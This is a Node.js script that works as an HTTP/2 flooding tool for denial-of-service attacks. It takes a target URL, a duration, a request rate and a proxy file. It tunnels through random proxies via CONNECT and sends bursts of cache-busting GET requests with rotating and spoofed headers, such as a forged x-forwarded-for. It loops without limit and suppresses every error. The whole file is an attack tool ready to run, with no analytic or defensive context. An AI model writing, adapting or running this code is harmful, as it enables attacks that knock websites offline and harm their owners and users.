const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

// ---------------- BASE ----------------

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf8").trim().split("\n");

// быстрый выбор
const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];

const rateHeaders = [
    { "accept": "text/html,*/*" },
    { "accept-language": "en-US,en;q=0.7" },
    { "origin": "https://" + parsedTarget.host },
    { "x-forwarded-for": "127.0.0." + Math.floor(Math.random() * 250) },
    { "dnt": "1" },
    { "te": "trailers" }
];

const baseHeaders = {
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":method": "GET",
    "accept-encoding": "gzip, deflate, br",
    "cache-control": "no-cache",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "sec-fetch-dest": "document"
};

// TLS контекст
const secureContext = tls.createSecureContext({
    ciphers: crypto.constants.defaultCoreCipherList,
    honorCipherOrder: false,
    secureProtocol: "TLS_method"
});

// ---------------- CONNECT HANDLER ----------------

function createTunnel(proxyHost, proxyPort, destHost, callback) {
    const socket = net.connect(proxyPort, proxyHost);

    socket.once("connect", () => {
        socket.write(
            `CONNECT ${destHost}:443 HTTP/1.1\r\nHost: ${destHost}\r\nConnection: keep-alive\r\n\r\n`
        );
    });

    socket.once("data", (chunk) => {
        if (!chunk.toString().includes("200")) {
            socket.destroy();
            return callback(null);
        }
        return callback(socket);
    });

    socket.on("error", () => {
        socket.destroy();
        callback(null);
    });
}

// ---------------- FLOODER ----------------

function runFlooder() {
    const proxy = rand(proxies).split(":");
    const proxyHost = proxy[0];
    const proxyPort = ~~proxy[1];

    createTunnel(proxyHost, proxyPort, parsedTarget.host, (tunnel) => {
        if (!tunnel) return;

        const tlsConn = tls.connect({
            socket: tunnel,
            servername: parsedTarget.host,
            secureContext,
            ALPNProtocols: ["h2"],
            rejectUnauthorized: false
        });

        tlsConn.setNoDelay(true);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                initialWindowSize: 15564991,
                maxFrameSize: 16384,
                headerTableSize: 65536,
                maxHeaderListSize: 32768
            }
        });

        client.setNoDelay(true);

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {

                    const hdr = {
                        ...baseHeaders,
                        ":path": parsedTarget.path + "?id=" + (Math.random()*1000|0),
                        ...rand(rateHeaders)
                    };

                    const req = client.request(hdr, {
                        parent: 0,
                        exclusive: true,
                        weight: 220
                    });

                    req.on("response", () => {
                        req.close();
                        req.destroy();
                    });

                    req.end();
                }
            }, 300);
        });

        const closeAll = () => {
            client.destroy();
            tlsConn.destroy();
            tunnel.destroy();
        };

        client.on("error", closeAll);
        client.on("close", closeAll);
        client.on("timeout", closeAll);
    });
}

// run
setInterval(runFlooder);

setTimeout(() => process.exit(0), args.time * 1000);
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
